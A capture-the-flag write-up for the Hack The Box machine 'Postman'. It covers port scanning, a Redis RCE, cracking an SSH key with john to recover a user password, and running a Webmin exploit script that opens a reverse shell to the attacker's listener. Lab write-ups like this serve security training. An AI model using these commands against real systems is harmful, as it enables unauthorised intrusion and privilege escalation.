# [Postman](https://app.hackthebox.com/machines/postman)


```bash
rustscan 10.10.10.160 --ulimit 5000 -b 2000 -t 2000
```

![Alt text](img/image.png)

Let's do nmap for open ports.

```bash
nmap -sC -sV -A -p22,80,6379,10000 10.10.10.160 -Pn
```

![Alt text](img/image-1.png)


I searched exploit for Redis '4.0.9' on Google and find [this](https://m0053sec.wordpress.com/2020/02/13/redis-remote-code-execution-rce/)


I do all steps on this article and got shell.

![Alt text](img/image-2.png)

While enumerating machine, I see that I don't have privilege to look at user.txt file, need to pivot into 'Matt' user.

![Alt text](img/image-3.png)


I found 'id_rsa.bak' file on '/opt' directory.

![Alt text](img/image-4.png)


Let's try to crack this RSA key using `ssh2john` and `john` tools.

```bash
ssh2john ssh_key > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
```

![Alt text](img/image-5.png)


We know that password is 'computer2008', after knowing the password of 'Matt' user, we can switch via `su` command.

Matt: computer2008

![Alt text](img/image-6.png)


user.txt

![Alt text](img/image-7.png)


For privilege escalation vector, I can't find anything, that's why I searched Webmin service version (1.910) to find any exploit.

![Alt text](img/image-8.png)


Let's try to use this. (I remove some unnecessary codes from exploit) by writing below.

```bash
python2 webmin_exploit.py --rhost 10.10.10.160 --rport 10000 -u Matt -p computer2008 --lhost 10.10.16.3 --lport 1337 -s true
```

I got reverse shell via listener (port -1337).

root.txt

![Alt text](img/image-10.png)